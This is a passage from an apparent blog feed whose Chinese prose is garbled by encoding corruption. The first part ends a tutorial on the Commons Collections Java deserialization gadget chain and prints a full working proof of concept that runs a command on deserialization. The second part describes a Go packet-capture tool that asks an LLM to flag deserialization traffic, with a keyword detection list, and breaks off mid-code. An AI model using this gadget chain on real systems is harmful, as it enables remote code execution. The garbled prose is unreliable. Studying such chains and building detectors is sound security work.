title="æ”¹å˜setValueå‚æ•°å€¼"></a>æ”¹å˜setValueå‚æ•°å€¼</h3><p>è¿™é‡Œçš„setValueæ˜¯ä»–èµ‹äºˆçš„å€¼ï¼Œæˆ‘ä»¬è¦æ±‚ä¼ å…¥çš„setValueå‚æ•°å€¼éœ€è¦ä¸ºRuntime.classï¼Œè§ä¸Šæ–‡ä»£ç 4</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709225420898.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709225420898.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å›æƒ³ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ˜¯åœ¨å“ªéœ€è¦è¿™ä¸ªRuntime.classï¼Ÿæ˜¯åœ¨ä»£ç 2ä¸­çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">gMethod</span> <span class="operator">=</span>(Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br></pre></td></tr></table></figure><p>åªæ˜¯åœ¨åé¢æ„é€ æ—¶ä¸€æ­¥ä¸€æ­¥ç”¨ä¸åŒçš„å‡½æ•°ä¼ å‚ï¼Œå…ˆæ˜¯chainedTransformerï¼Œåˆæ˜¯setValue</p><p>æ—¢ç„¶æ˜¯åœ¨æœ€å¼€å§‹çš„InvokerTransformer.transformä¸­ä½¿ç”¨ï¼Œåˆšå¥½æœ‰ä¸€ä¸ªTransformerï¼Œå«ConstantTransformerã€‚æ„é€ å‡½æ•°ä¼ å…¥å¸¸é‡ï¼Œç„¶åå…¶transformerè¿”å›è¯¥å¸¸é‡ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709231907392.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709231907392.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£åœ¨ChainedTransformerè°ƒç”¨æœ€å¼€å§‹åŠ ä¸€ä¸ªå®ä¾‹åŒ–ConstantTransformerï¼Œä¼ å…¥Runtime.classä¸å°±å®Œäº†ï¼Ÿå³ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ ¹æœ¬ä¸ç”¨ç®¡setValueä¼ ä»€ä¹ˆäº†ã€‚</p><p>å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        Constructor&lt;?&gt; AnnotationInvocationHandlerConstructor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> AnnotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line">        serialize(annotationInvocationHandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">&quot;serialize&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(Filename)));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;unserialize&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709235653625.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240709235653625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="è°ƒå¼å¤æµ‹"><a href="#è°ƒå¼å¤æµ‹" class="headerlink" title="è°ƒå¼å¤æµ‹"></a>è°ƒå¼å¤æµ‹</h3><p>åœ¨ååºåˆ—åŒ–å‡ºæ‰“ä¸Šæ–­ç‚¹ï¼Œä¸€è·¯æ­¥è¿›å°±èƒ½çœ‹åˆ°å®Œæ•´è¿‡ç¨‹ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240710110144246.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240710110144246.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è°ƒç”¨é“¾å®Œæ•´å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* ObjectInputStream.readObject()</span><br><span class="line">*           AnnotationInvocationHandler.readObject()</span><br><span class="line">*                 MapEntry.setValue()</span><br><span class="line">*                    TransformedMap.checkSetValue()</span><br><span class="line">*                       ChainedTransformer.transform()</span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œæˆ‘ä»¬åœ¨ä¸Šæ–‡å¯ä»¥çœ‹åˆ°ï¼ŒLazyMap.get()ä¹Ÿè°ƒç”¨äº†transformæ–¹æ³•ï¼Œä¸‹ä¸€ç¯‡è®²ç”¨LazyMapæ„é€ CCååºåˆ—åŒ–é“¾</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240708164815135.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>golangæ„é€ TCPé‡ç»„åŒ…é—®è¯¢GPTæ£€æµ‹ååºåˆ—åŒ–æµé‡</title>
      <link href="/2024/05/06/bi-she/"/>
      <url>/2024/05/06/bi-she/</url>
      
        <content type="html"><![CDATA[<h1 id="golangæ„é€ TCPé‡ç»„åŒ…é—®è¯¢GPTæ£€æµ‹ååºåˆ—åŒ–æµé‡"><a href="#golangæ„é€ TCPé‡ç»„åŒ…é—®è¯¢GPTæ£€æµ‹ååºåˆ—åŒ–æµé‡" class="headerlink" title="golangæ„é€ TCPé‡ç»„åŒ…é—®è¯¢GPTæ£€æµ‹ååºåˆ—åŒ–æµé‡"></a>golangæ„é€ TCPé‡ç»„åŒ…é—®è¯¢GPTæ£€æµ‹ååºåˆ—åŒ–æµé‡</h1><p>å‰è¨€ï¼šè·ç¦»ä¸Šæ¬¡çš„JAVAç½‘ä¸Šä¹¦åŸï¼ˆå®Œå…¨å¤Ÿæ¯•è®¾å·¥ä½œé‡ï¼Œæ¯•è®¾åšJAVAå¯ä»¥çœ‹<a href="https://godownio.github.io/2023/05/20/java-shu-cheng-kai-fa-quan-liu-cheng/">https://godownio.github.io/2023/05/20/java-shu-cheng-kai-fa-quan-liu-cheng/</a> ï¼‰å·²ç»è¿‡å»äº†ä¸€å¹´äº†ã€‚</p><p>æœ¬é¡¹ç›®forkè‡ª<a href="https://github.com/evepupil/ip_package">https://github.com/evepupil/ip_package</a> ã€‚ä»¿Wiresharkçº¯æŠ“åŒ…å·¥å…·ï¼ŒåŠ äº†ä¸ªæ¨¡ç³ŠåŒ¹é…å­—èŠ‚è¯¢é—®GPTæ˜¯å¦ä¸ºæ¶æ„æ•°æ®ã€‚</p><p>æˆå“å›¾å¦‚ä¸‹ï¼š</p><ul><li>æ¶æ„æµé‡æ£€æµ‹æ¨¡å—ï¼š</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/718010841cfdfab5a4b8d573e56bc2ab.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/718010841cfdfab5a4b8d573e56bc2ab.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/08cfc52f4e4aae7b92ebca557f96b2dc.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/08cfc52f4e4aae7b92ebca557f96b2dc.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li>å…¨æµé‡æ¨¡å—</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506163017511.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506163017511.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŠ ä¸ªç‹—å±UIèŠ±äº†ä¸‰å€ä»¥ä¸Šçš„ä»£ç å’Œæ—¶é—´ã€‚</p><p>åˆ›æ–°ç‚¹ï¼šgoæœ¬èº«çº¿ç¨‹å®‰å…¨ï¼ˆä½œä¸ºå¸¸é©»WAFæœ¬èº«ä¸æ˜“é­åˆ°æ”»å‡»ï¼‰ï¼ŒgopacketåŸºäºNpcapï¼ŒWinpcapå‡çº§ç‰ˆï¼Œgoroutineåç¨‹æ•ˆç‡é«˜ï¼Œèµ„æºæ¶ˆè€—ä½ã€‚LLMåˆ¤ç»“æœï¼Œæ–¹ä¾¿ä¸”æ›´æ–°å¿«ã€‚</p><h2 id="go-fyneç¯å¢ƒæ­å»ºé—®é¢˜"><a href="#go-fyneç¯å¢ƒæ­å»ºé—®é¢˜" class="headerlink" title="go-fyneç¯å¢ƒæ­å»ºé—®é¢˜"></a>go-fyneç¯å¢ƒæ­å»ºé—®é¢˜</h2><p>tdmè®°å¾—å‹¾å€’æ•°ç¬¬äºŒä¸ªæ’ä»¶</p><p>è¦è£…npcap</p><p>go env -w CGO_ENABLED&#x3D;1</p><p>gccç¯å¢ƒå˜é‡</p><p>gccæ”¹ç¯å¢ƒå˜é‡ågolandéœ€è¦é‡å¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302193025972.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302193025972.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302193000453.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302193000453.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="ä½¿ç”¨æ‰‹å†Œ"><a href="#ä½¿ç”¨æ‰‹å†Œ" class="headerlink" title="ä½¿ç”¨æ‰‹å†Œ"></a>ä½¿ç”¨æ‰‹å†Œ</h2><p>æœ¬å·¥å…·å·²å°†é˜¿é‡Œqwen LLM SDKæ‹–åˆ°æœ¬åœ°ï¼Œè¯·å‰å¾€qwen_model.goä¿®æ”¹ChatQWenModelä¸ºè‡ªå·±éœ€è¦çš„LLM</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ChatQWenModel = <span class="string">&quot;qwen-turbo&quot;</span></span><br></pre></td></tr></table></figure><p>è®¡è´¹å¦‚ä¸‹ï¼ˆè¶Šè´µè¶Šæ…¢ï¼Œä½†æ˜¯æ›´å‡†ï¼‰ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506164052032.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506164052032.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨http_copy.go#queryAI()æŠŠapiKeyä¿®æ”¹ä¸ºè‡ªå·±çš„çµç§¯APIï¼Œè¯·å‰å¾€<a href="https://dashscope.console.aliyun.com/apiKey">https://dashscope.console.aliyun.com/apiKey</a></p><p>ç¯å¢ƒä½¿ç”¨go 1.21.9ï¼Œåœ¨1.1+éƒ½OKï¼Œc++ç¯å¢ƒä½¿ç”¨TDM-GCCï¼Œéœ€è¦å®‰è£…fyneï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get fyne.io/fyne/v2</span><br></pre></td></tr></table></figure><p>ç‚¹å‡»<code>å¼€å§‹/åˆ‡æ¢</code>ï¼Œä¸€èˆ¬é€‰æ‹©Loopbackåšæµ‹è¯•ï¼ŒLoopbackæ˜¯å®‰è£…wiresharkæ‰€å¸¦çš„æœ¬åœ°ç¯å›åœ°å€ç½‘å¡ï¼Œç›‘æµ‹ä»¥å¤ªç½‘æ˜¯æ— æ³•ç›‘æµ‹åˆ°ç¯å›åœ°å€æµé‡çš„ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506164734028.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506164734028.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŒç†ï¼Œå…¨æµé‡ä¹Ÿé€‰æ‹©ç½‘å¡å³å¯ã€‚</p><ul><li>å…¨æµé‡æ¨¡å¼ï¼šå¯ä»¥ä½¿ç”¨èœå•ä¸Šæ‰€æœ‰åŠŸèƒ½ï¼Œå¦‚è¿‡æ»¤ã€æ’åºã€æ•è·ç­‰ï¼ˆä¸¥æ ¼æ¨¡å¼ï¼šåªæ¥æ”¶æ¥è‡ªIPåŒ…å‘å¾€æœ¬æœºçš„æ•°æ®åŒ…ï¼›æ··æ‚æ¨¡å¼ï¼šæ¥æ”¶å‘å¾€å…¶ä»–ä¸»æœºï¼Œæµç»è¿‡æœ¬åœ°çš„æ•°æ®åŒ…ï¼‰</li><li>HTTPæµé‡åˆ†ææ¨¡å¼ï¼šå¯ä»¥ä½¿ç”¨æš‚åœç»§ç»­ï¼Œå‘é€æ•°æ®åŒ…åŠŸèƒ½ã€‚</li></ul><p>åœ¨runRequest()ä¿®æ”¹targetStringsåŒ¹é…è§„åˆ™</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">targetStrings := []<span class="type">string</span>&#123;<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&quot;rO0A&quot;</span>, <span class="string">&quot;@type&quot;</span>, <span class="string">&quot;aced&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸ªBUGï¼Œæˆ‘åœ¨AIå›ç­”æ¯éš”31ä¸ªå­—ç¬¦æ’å…¥ä¸€ä¸ªå›è½¦ï¼Œä½†æ˜¯æ€»æ˜¯æ¢è¡Œæ··ä¹±ã€‚</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">insertNewlineEveryNChars</span><span class="params">(s <span class="type">string</span>, n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result <span class="type">string</span></span><br><span class="line">    <span class="keyword">for</span> i, r := <span class="keyword">range</span> s &#123;</span><br><span class="line">       result += <span class="type">string</span>(r)</span><br><span class="line">       <span class="keyword">if</span> (i+<span class="number">1</span>)%n == <span class="number">0</span> &amp;&amp; i+<span class="number">1</span> &lt; <span class="built_in">len</span>(s) &#123;</span><br><span class="line">          result += <span class="string">&quot;\n&quot;</span></span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºæ— æ³•åŠ å…¥CAè¯ä¹¦ï¼Œæ‰€ä»¥æš‚æ—¶è¿˜ä¸çŸ¥é“æ€ä¹ˆåˆ†æåŠ å¯†çš„HTTPSæµé‡ï¼Œäº¤ç»™ä½ ä»¬äº†ã€‚</p><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>ä½¿ç”¨äº†embedæ‰“åŒ…é™æ€æ•°æ®ï¼Œapp.go#Run()å‡½æ•°ä¸ºFyneçš„é˜»å¡å‡½æ•°ï¼Œåº”ç”¨ç¨‹åºè¿è¡Œçš„ä¸»å‡½æ•°ã€‚</p><p>LoadMenus()åŠ è½½èœå•æ•°æ®ï¼Œåœ¨é‡Œé¢çš„åˆ‡æ¢å“åº”çš„å›è°ƒå‡½æ•°SetAllContainer(w, A)è®¾ç½®äº†åˆ—å¤´ã€‚</p><p>ç›¸åº”çš„SetContainer(w, A)è®¾ç½®äº†å¦ä¸€ä¸ªContainerã€‚å…¨æµé‡æŠ“åŒ…é€»è¾‘åœ¨GetPkg()ï¼ŒHTTPæŠ“åŒ…é€»è¾‘åœ¨GetHTTPPkg()ã€‚GetPkg()é€»è¾‘å¾ˆå¥½ç†è§£ï¼Œä¸€å±‚ä¸€å±‚è·Ÿä¸‹å»çœ‹ä»£ç å°±è¡Œäº†</p><p>é‡ç‚¹æ˜¯GetHTTPPkg()</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetHTTPPkg</span><span class="params">(ctx context.Context, device_str <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> util.Run()()</span><br><span class="line">    handle, err := pcap.OpenLive(device_str, snapshot_len, Promiscuous, timeout)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := handle.SetBPFFilter(*filter); err != <span class="literal">nil</span> &#123;</span><br><span class="line">       log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line">    No := <span class="number">1</span></span><br><span class="line">    <span class="comment">// Set up assembly</span></span><br><span class="line">    streamFactory := &amp;httpStreamFactory&#123;&#125;</span><br><span class="line">    streamPool := tcpassembly.NewStreamPool(streamFactory)</span><br><span class="line">    assembler := tcpassembly.NewAssembler(streamPool)</span><br><span class="line"></span><br><span class="line">    log.Println(<span class="string">&quot;reading in packets&quot;</span>)</span><br><span class="line">    <span class="comment">// Read in packets, pass to assembler.</span></span><br><span class="line">    packetSource := gopacket.NewPacketSource(handle, handle.LinkType())</span><br><span class="line">    packets := packetSource.Packets()</span><br><span class="line">    ticker := time.Tick(time.Minute)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> Interupt == <span class="literal">false</span> &#123;</span><br><span class="line">          <span class="keyword">select</span> &#123;</span><br><span class="line">          <span class="keyword">case</span> packet := &lt;-packets:</span><br><span class="line">             <span class="comment">// A nil packet indicates the end of a pcap file.</span></span><br><span class="line">             <span class="keyword">if</span> packet == <span class="literal">nil</span> &#123;</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> *logAllPackets &#123;</span><br><span class="line">                log.Println(packet)</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> packet.NetworkLayer() == <span class="literal">nil</span> || packet.TransportLayer() == <span class="literal">nil</span> || packet.TransportLayer().LayerType() != layers.LayerTypeTCP &#123;</span><br><span class="line">                log.Println(<span class="string">&quot;Unusable packet&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">             &#125;</span><br><span class="line">             tcp := packet.TransportLayer().(*layers.TCP)</span><br><span class="line">             assembler.AssembleWithTimestamp(packet.NetworkLayer().NetworkFlow(), tcp, packet.Metadata().Timestamp)</span><br><span class="line">          <span class="keyword">case</span> &lt;-ticker:</span><br><span class="line">             <span class="comment">// Every minute, flush connections that haven&#x27;t seen activity in the past 2 minutes.</span></span><br><span class="line">             assembler.FlushOlderThan(time.Now().Add(time.Minute * <span class="number">-2</span>))</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       No++</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>assembler.AssembleWithTimestamp(packet.NetworkLayer().NetworkFlow(), tcp, packet.Metadata().Timestamp)</code>è¿›è¡Œäº†TCPé‡ç»„ï¼Œé˜²æ­¢TCPåˆ†ç‰‡æŠŠHTTPæ•°æ®åŒ…åˆ†å‘ˆå¥½å‡ ç‰‡ï¼Œçœ‹ä¸äº†ä¸€ç‚¹ã€‚</p><p>åœ¨è°ƒç”¨AssembelWithTimestamp()æ—¶ï¼Œå†…ç½®å‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨(h *httpStreamFactory) New()å‡½æ•°å¤„ç†HTTPæµé‡</p><p>é‡æ„ä¸€ä¸‹Newå‡½æ•°ä¸ºè‡ªå·±çš„å¤„ç†é€»è¾‘ï¼Œæ¯”å¦‚è£…å…¥ä¸€ä¸ªæ–°structï¼Œåœ¨GUIå±•ç¤ºçš„æ—¶å€™å°±å¾ˆå¥½åŠäº†ã€‚</p><figure class="highlight go"><table><tr><td 